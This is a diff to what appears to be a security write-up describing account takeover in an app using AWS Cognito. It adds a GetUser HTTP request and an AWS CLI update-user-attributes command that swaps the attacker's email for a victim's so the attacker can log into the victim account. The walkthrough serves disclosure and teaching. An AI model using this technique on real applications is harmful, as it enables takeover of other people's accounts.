@@ -26,6 +26,27 @@ The flow will be as follows
 User login -> AWS Cognito (Authentication) -> AWS Cognito (Get User Attributes) -> Application Login
 
 The request for `Get User Attribute` will have a header named `X-Amz-Target: AWSCognitoIdentityProviderService.GetUser` and the response for the request will be as follows
+**Request:**
+```
+POST / HTTP/2
+Host: cognito-idp.us-west-2.amazonaws.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-amz-json-1.1
+X-Amz-Target: AWSCognitoIdentityProviderService.GetUser
+X-Amz-User-Agent: aws-amplify/5.0.4 js
+Content-Length: 1072
+Origin: https://<REDACTED>
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+
+{"AccessToken":"<Token>"}
+```
+
+**Response:**
 ```
 {
     "Username": "attacker@attacker.com",
@@ -46,4 +67,11 @@ The request for `Get User Attribute` will have a header named `X-Amz-Target: AWS
 }
 ``` 
 
-	
+The above response gives us the list of `user attributes` available. Among those three attributes the `email` attribute is interesting. If we can able to change our email address to victim's email address then we were able to login to the victim account with our attacker's password right? So with this mindset I started the exploitation process by making a request to `Update UserAttributes`. The Update User attribute request can be done by using `AWS CLI` or using a `HTTP Request`. Both examples have been given below
+
+**AWS CLI**
+```
+aws cognito-idp update-user-attributes --region us-west-2 --access-token <Token> --user-attributes 'Name=email,Value=**victim@victim.com**'
+```
+
+Run the above command
